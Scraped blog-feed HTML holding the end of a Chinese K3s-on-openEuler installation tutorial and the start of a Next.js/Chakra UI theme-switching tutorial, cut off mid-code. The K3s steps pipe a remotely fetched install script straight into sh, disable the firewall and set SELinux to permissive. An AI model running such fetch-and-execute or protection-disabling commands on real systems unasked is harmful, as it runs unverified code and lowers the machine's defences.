<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ddeb91ced904a9c93334eb6bce0a9e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=bCyyuij1EcVH8M6XKxco79Z9Ayc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fb4c25d33ed407c8c85d4a4799ebb67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=Gy4i8PI6ZdRB%2FqZGyFN%2Fvzw5RaE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-3">步骤一：系统初始化（单节点执行）</h3>
<p>为确保 <code>K3s</code> 顺利运行，我们进行标准化的系统环境准备。</p>
<ol>
<li>
<p><strong>关闭防火墙和 SELinux</strong>（为简化教程，生产环境应配置精细规则）：</p>
<pre><code class="hljs language-bash" lang="bash">systemctl stop firewalld
systemctl <span class="hljs-built_in">disable</span> firewalld

<span class="hljs-comment"># 临时关闭SELinux</span>
setenforce 0
<span class="hljs-comment"># 永久关闭，重启生效</span>
sed -i <span class="hljs-string">'s/^SELINUX=enforcing$/SELINUX=permissive/'</span> /etc/selinux/config
</code></pre>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a4b8d7f6dee416db6b16af637e8d5e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=ajS1Q2yo1VjfBx21DI00AO4Cx%2BU%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol start="2">
<li>
<p><strong>关闭 Swap 分区</strong>（K8s/K3s 的标准要求）：</p>
<pre><code class="hljs language-bash" lang="bash">swapoff -a
<span class="hljs-comment"># 永久关闭，注释掉 /etc/fstab 中的 swap 行</span>
sed -i <span class="hljs-string">'/ swap / s/^/#/'</span> /etc/fstab
</code></pre>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/675c1289e24f407bbedb63878ca39c50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=EuGLtl7K%2Bi8%2FtuWqM%2FBYnz74%2FOo%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol start="3">
<li>
<p><strong>确保内核模块加载</strong>（<code>openEuler 24.03</code> 默认已支持）：
<code>K3s</code> 依赖 <code>br_netfilter</code> 和 <code>overlay</code> 等模块。<code>openEuler 24.03</code> 默认支持良好，我们可以手动检查加载</p>
<pre><code class="hljs language-bash" lang="bash">modprobe br_netfilter
modprobe overlay

<span class="hljs-comment"># 验证内核参数</span>
<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | sudo tee /etc/sysctl.d/k8s.conf
net.bridge.bridge-nf-call-ip6tables = 1
net.bridge.bridge-nf-call-iptables = 1
net.ipv4.ip_forward                 = 1
EOF</span>
sysctl --system
</code></pre>
</li>
</ol>
<p>执行 <code>sysctl --system</code> 后，应看到配置生效的输出</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf76cb69de584b1fa64d69a365ab7c0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=RJ5yNqYnKD19YIbrf9fWmz%2BpL3g%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-4">步骤二：安装 K3s（单节点执行）</h3>
<p><code>K3s</code> 以其“一键安装”而闻名。我们将使用国内镜像源来加速安装过程</p>
<ol>
<li>
<p><strong>执行 K3s 官方安装脚本（使用国内镜像）：</strong>
openEuler 24.03 已内置 <code>curl</code>，可直接使用。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 mirror.rancher.cn 作为国内加速镜像</span>
curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -
</code></pre>
<p>这条命令会自动下载 K3s 二进制文件，并将其注册为 systemd 服务自动运行。安装过程非常迅速，充分体现了其轻量化的优势。</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc1edafd38424a9b99c3cee90076afa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=8h%2F%2FYnonVfzzcTAAISag9ZPBxz0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol start="2">
<li>
<p><strong>检查 K3s 服务状态：</strong></p>
<pre><code class="hljs language-bash" lang="bash">systemctl status k3s
</code></pre>
<p>您应该能看到 <code>k3s.service</code> 处于 <code>active (running)</code> 状态，证明 <code>K3s</code> 已在 <code>openEuler 24.03</code>  上成功启动</p>
</li>
</ol>
<h3 data-id="heading-5">步骤三：配置 kubectl 访问 K3s 集群（单节点执行）</h3>
<p><code>K3s</code> 会自动生成一个 <code>kubeconfig</code> 文件，我们只需将其配置到 <code>kubectl</code> 默认读取的位置。</p>
<ol>
<li>
<p><strong>安装 kubectl（推荐）：</strong>
虽然 <code>K3s</code> 自带了 <code>kubectl</code> (位于 <code>/usr/local/bin/k3s kubectl</code>)，但为方便使用，我们安装 <code>openEuler</code> 源中提供的标准 <code>kubectl</code> 客户端。</p>
<pre><code class="hljs language-bash" lang="bash">dnf install -y kubectl
</code></pre>
</li>
<li>
<p><strong>配置 Kubeconfig：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建 .kube 目录</span>
<span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube

<span class="hljs-comment"># 复制 K3s 的配置文件，并设置正确权限（K3s的配置文件默认对 root 只读）</span>
<span class="hljs-built_in">cp</span> /etc/rancher/k3s/k3s.yaml <span class="hljs-variable">$HOME</span>/.kube/config
<span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config
<span class="hljs-built_in">chmod</span> 600 <span class="hljs-variable">$HOME</span>/.kube/config
</code></pre>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec5a1afdf0f840f1971ccdf30979add4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=qTsNEoK8U74wtGfWAzbGsola1Zg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-6">步骤四：验证 K3s 单节点集群（单节点执行）</h3>
<p>现在，我们的单节点 K8s 集群已经准备就绪！</p>
<ol>
<li>
<p><strong>检查节点状态：</strong></p>
<pre><code class="hljs language-bash" lang="bash">kubectl get nodes
</code></pre>
<p>您会看到您的虚拟机主机名显示为 <code>Ready</code> 状态，并且 <code>ROLES</code> 包含 <code>control-plane,master</code>。这证明 <code>openEuler 24.03</code> 作为一个节点已成功注册到 <code>K3s</code> 集群中</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8bb5c057b4d412ea43c6982316724be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=TZBHY41zvaAbPedPQzydGX%2Bna3c%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol start="2">
<li>
<p><strong>检查 K3s 内置组件：</strong>
<code>K3s</code> 的一大优势是“开箱即用”，它内置了 <code>Traefik（Ingress）</code>、<code>Metrics Server</code> 和 <code>CoreDNS</code> 等核心组件。</p>
<pre><code class="hljs language-bash" lang="bash">kubectl get pods -n kube-system
</code></pre>
<p>您会看到 <code>coredns-xxx</code>, <code>traefik-xxx</code>, <code>metrics-server-xxx</code> 等 Pod 都处于 <code>Running</code> 状态。这证明 <code>openEuler 24.03</code> 完美兼容 <code>K3s</code> 的所有内置服务，无需任何额外配置</p>
</li>
</ol>
<h3 data-id="heading-7">步骤五：部署并访问测试应用（单节点执行）</h3>
<p>最后，我们部署一个 <code>Nginx</code> 应用，并通过 <code>NodePort</code> 访问它，以验证 <code>K3s</code> 集群网络功能完整。</p>
<ol>
<li>
<p><strong>创建 Nginx Deployment 和 Service：</strong></p>
<pre><code class="hljs language-bash" lang="bash">kubectl create deployment nginx --image=nginx
kubectl expose deployment nginx --port=80 --<span class="hljs-built_in">type</span>=NodePort
</code></pre>
</li>
<li>
<p><strong>查看服务端口：</strong></p>
<pre><code class="hljs language-bash" lang="bash">kubectl get svc nginx
</code></pre>
<p>记下 <code>Nginx</code> 服务映射到宿主机的端口（例如 <code>80:3xxxx/TCP</code> 中的 <code>3xxxx</code>）。</p>
</li>
<li>
<p><strong>访问 Nginx：</strong>
您可以使用 <code>curl</code> 配合您虚拟机的 IP（或 <code>127.0.0.1</code>）和刚查到的 NodePort 端口号进行访问。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 假设查到的端口是 31080，使用 localhost 访问</span>
curl http://127.0.0.1:31080

<span class="hljs-comment"># 或者使用虚拟机的 IP (假设为 192.168.1.10)</span>
<span class="hljs-comment"># curl http://192.168.1.10:31080</span>
</code></pre>
<p>成功返回 <code>Nginx</code> 的欢迎页面，标志着这个基于 <code>openEuler 24.03</code> 的 <code>K3s</code> 单节点集群功能完整，网络通畅！</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ec939538e034faba3b99d5b17dbfaf5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=q4s21ol5zcMGXisPixWhSmIe8oQ%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-8">四、 评测总结：稳固、高效、轻量的全场景底座</h2>
<p>通过在 <code>openEuler 24.03 LTS SP2</code> 单机环境中部署 <code>K3s</code> 的实战评测，我们可以得出以下深刻结论：</p>
<ol>
<li><strong>完美兼容，极致轻量：</strong> 整个安装过程“一键成功”，<code>K3s</code> 及其依赖的 <code>containerd</code>、<code>cni</code> 等组件在 <code>openEuler 24.03</code> 上运行完美，无需任何额外补丁或繁琐配置。这得益于 <code>openEuler 24.03</code> 搭载的 <code>6.6</code> 内核对 <code>cgroup v2</code> 和内核网络特性的原生支持。系统启动后，<code>K3s</code> 自身资源占用极低，与 <code>openEuler</code> 高效的内核调度结合，为资源受限场景提供了最大化的业务运行空间</li>
<li><strong>生态成熟，开箱即用：</strong> <code>K3s</code> 自带的 <code>Traefik</code>、<code>CoreDNS</code>、<code>Metrics-Server</code> 等核心服务均能稳定运行，证明了 <code>openEuler 24.03</code> 作为云原生底座的生态成熟度和高兼容性。其 <code>dnf</code> 源中提供的 <code>kubectl</code> 等工具链版本匹配、易于获取，极大提升了易用性</li>
<li><strong>开发者与边缘的“黄金搭档”：</strong> “<code>openEuler 24.03 + K3s</code>”的组合，是开发者在单机（如笔记本电脑、开发虚拟机）上模拟完整 <code>K8s API</code> 环境的最佳实践。它开机资源占用极低、启动迅速，让开发者能快速搭建、销毁和测试环境。更重要的是，这套组合为蓬勃发展的边缘计算市场（如物联网网关、智能摄像头、边缘 <code>AI</code> 盒子）提供了一个经过验证的、高可靠、高性能的理想底座</li>
</ol>
<h2 data-id="heading-9">五、 未来展望：AI 浪潮下的“全能” openEuler</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ddd68d5e9c74bb9938787b90bcc479d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r6q6LSw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765429532&amp;x-signature=dQHnwnIBMkoyJu%2BIqHaxyd8zzmA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>随着大模型和 <code>AI</code> 应用的爆发，算力调度、<code>GPU/NPU</code> 资源池化、<code>AI</code> 框架与 <code>K8s</code> 的深度融合已成趋势。<code>openEuler</code> 社区早已在此布局，其在异构算力支持（如对昇腾、英伟达等 <code>AI</code> 芯片的适配）、<code>AI</code> 容器（如 <code>MindSpore</code> 容器）优化、<code>Cgroup</code> 对 <code>AI</code> 算力资源的精细化管理等方面持续发力。</p>
<p>从本次 <code>K3s</code> 实战的“轻盈”出发，到承载数据中心 <code>K8s</code> 集群的“稳重”，再到拥抱未来云原生 <code>AI</code> 的“智能”，<code>openEuler 24.03 LTS SP2</code> 凭借其强大的 <code>6.6</code> 内核和完善的开源生态，真正践行了其作为“面向数字基础设施”的“全场景”开源操作系统的承诺</p>
<p>分享一下 <code>openEuler</code> 相关产品官方信息：​<br/>
1.产品地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.org%2F" target="_blank" title="https://www.openeuler.org/" ref="nofollow noopener noreferrer">www.openeuler.org/​</a><br/>
2.评测地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.org%2F" target="_blank" title="https://www.openeuler.org/" ref="nofollow noopener noreferrer">www.openeuler.org/​</a><br/>
3.产品使用说明：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openeuler.openatom.cn%2Fzh%2F" target="_blank" title="https://docs.openeuler.openatom.cn/zh/" ref="nofollow noopener noreferrer">docs.openeuler.openatom.cn/zh/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js Page Router + Chakra UI 实现优雅的主题切换 🌓]]></title>    <link>https://juejin.cn/post/7579553111472996406</link>    <guid>https://juejin.cn/post/7579553111472996406</guid>    <pubDate>2025-12-04T04:39:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579553111472996406" data-draft-id="7579555970595995689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js Page Router + Chakra UI 实现优雅的主题切换 🌓"/> <meta itemprop="keywords" content="Next.js"/> <meta itemprop="datePublished" content="2025-12-04T04:39:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dorisrv"/> <meta itemprop="url" content="https://juejin.cn/user/1522178380270712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js Page Router + Chakra UI 实现优雅的主题切换 🌓
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1522178380270712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dorisrv
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T04:39:00.000Z" title="Thu Dec 04 2025 04:39:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js Page Router + Chakra UI 实现优雅的主题切换 🌓</h2>
<blockquote>
<p>从0到1搭建Next.js主题切换功能，让你的应用更具个性化体验</p>
</blockquote>
<h3 data-id="heading-1">📌 引言</h3>
<p>主题切换功能已经成为现代Web应用的标配，它不仅能提升用户体验，还能满足不同用户在不同场景下的使用需求。本文将带你从0到1使用Next.js Page Router和Chakra UI实现一个优雅的主题切换功能。</p>
<h4 data-id="heading-2">技术栈</h4>
<ul>
<li><strong>Next.js 16</strong> (Page Router)</li>
<li><strong>Chakra UI 3</strong></li>
<li><strong>next-themes</strong></li>
<li><strong>TypeScript</strong></li>
</ul>
<h4 data-id="heading-3">最终效果</h4>
<ul>
<li>🌞 浅色模式和 🌙 深色模式无缝切换</li>
<li>主题状态持久化存储</li>
<li>支持系统主题检测</li>
<li>优雅的图标动画</li>
</ul>
<h3 data-id="heading-4">🚀 第一步：初始化Next.js项目</h3>
<p>首先，我们使用官方的<code>create-next-app</code>命令初始化一个Next.js项目：</p>
<pre><code class="hljs language-bash" lang="bash">npx create-next-app@latest next-page-router-chakra-theme-switch --typescript --app-router <span class="hljs-literal">false</span>
<span class="hljs-built_in">cd</span> next-page-router-chakra-theme-switch
</code></pre>
<blockquote>
<p>注意：我们使用<code>--app-router false</code>来明确使用Page Router，而不是App Router</p>
</blockquote>
<p>初始化完成后，项目结构如下：</p>
<pre><code class="hljs language-lua" lang="lua">├── src/
│   ├── pages/
│   │   ├── _app.tsx
│   │   ├── _document.tsx
│   │   └── index.tsx
│   └── styles/
├── public/
├── <span class="hljs-built_in">package</span>.json
└── <span class="hljs-built_in">next</span>.<span class="hljs-built_in">config</span>.ts
</code></pre>
<h3 data-id="heading-5">📦 第二步：安装必要的依赖</h3>
<p>接下来，我们需要安装Chakra UI、next-themes和图标库：</p>
<pre><code class="hljs language-bash" lang="bash">npm install @chakra-ui/react @emotion/react next-themes react-icons
</code></pre>
<ul>
<li><strong>@chakra-ui/react</strong>：提供UI组件和主题系统</li>
<li><strong>@emotion/react</strong>：Chakra UI的依赖，用于样式处理</li>
<li><strong>next-themes</strong>：Next.js专用的主题管理库</li>
<li><strong>react-icons</strong>：提供图标支持</li>
</ul>
<h3 data-id="heading-6">⚙️ 第三步：配置Chakra UI和next-themes</h3>
<h4 data-id="heading-7">配置_app.tsx</h4>
<p>修改<code>src/pages/_app.tsx</code>文件，添加Chakra UI和next-themes的提供者：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// src/pages/_app.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChakraProvider</span>, defaultSystem } <span class="hljs-keyword">from</span> <span class="hljs-string">"@chakra-ui/react"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ThemeProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next-themes"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/app"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params">{ Component, pageProps }: AppProps</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChakraProvider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{defaultSystem}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ThemeProvider</span> <span class="hljs-attr">attribute</span>=<span class="hljs-string">"class"</span> <span class="hljs-attr">disableTransitionOnChange</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Component</span> {<span class="hljs-attr">...pageProps</span>} /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeProvider</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ChakraProvider</span>&gt;</span></span>
  )
}
</code></pre>
<p>这里我们配置了：</p>
<ul>
<li><code>ChakraProvider</code>：Chakra UI的根提供者，使用默认主题系统</li>
<li><code>ThemeProvider</code>：next-themes的主题提供者，使用<code>class</code>属性来切换主题</li>
<li><code>disableTransitionOnChange</code>：禁用主题切换时的过渡效果，避免闪烁</li>
</ul>
<h3 data-id="heading-8">🛠️ 第四步：实现主题切换组件</h3>
<p>现在，我们创建一个专门的主题切换组件文件<code>src/components/color-mode.tsx</code>：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// src/components/color-mode.tsx</span>
<span class="hljs-string">"use client"</span>

<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">IconButtonProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@chakra-ui/react"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ClientOnly</span>, <span class="hljs-title class_">IconButton</span>, <span class="hljs-title class_">Skeleton</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@chakra-ui/react"</span>
<span class="hljs-keyword">import</span> { useTheme } <span class="hljs-keyword">from</span> <span class="hljs-string">"next-themes"</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">LuMoon</span>, <span class="hljs-title class_">LuSun</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-icons/lu"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ColorMode</span> = <span class="hljs-string">"light"</span> | <span class="hljs-string">"dark"</span>

<span class="hljs-comment">// 自定义Hook：获取和控制主题</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useColorMode</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { resolvedTheme, setTheme, forcedTheme } = <span class="hljs-title function_">useTheme</span>()
  <span class="hljs-comment">// 获取当前主题，如果有强制主题则使用强制主题</span>
  <span class="hljs-keyword">const</span> colorMode = forcedTheme || resolvedTheme
  
  <span class="hljs-comment">// 切换主题的函数</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleColorMode</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setTheme</span>(resolvedTheme === <span class="hljs-string">"dark"</span> ? <span class="hljs-string">"light"</span> : <span class="hljs-string">"dark"</span>)
  }
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">colorMode</span>: colorMode <span class="hljs-keyword">as</span> <span class="hljs-title class_">ColorMode</span>,
    <span class="hljs-attr">setColorMode</span>: setTheme, <span class="hljs-comment">// 设置主题</span>
    toggleColorMode,       <span class="hljs-comment">// 切换主题</span>
  }
}

<span class="hljs-comment">// 根据主题显示不同的图标</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ColorModeIcon</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { colorMode } = <span class="hljs-title function_">useColorMode</span>()
  <span class="hljs-comment">// 浅色模式显示太阳图标，深色模式显示月亮图标</span>
  <span class="hljs-keyword">return</span> colorMode === <span class="hljs-string">"dark"</span> ? <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LuMoon</span> /&gt;</span></span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">LuSun</span> /&gt;</span></span> 
}

<span class="hljs-comment">// 主题切换按钮组件</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">ColorModeButton</span> = <span class="hljs-title class_">React</span>.<span class="hljs-property">forwardRef</span>&lt;
  <span class="hljs-title class_">HTMLButtonElement</span>,
  <span class="hljs-title class_">IconButtonProps</span>
&gt;(<span class="hljs-keyword">function</span> <span class="hljs-title function_">ColorModeButton</span>(<span class="hljs-params">props, ref</span>) {
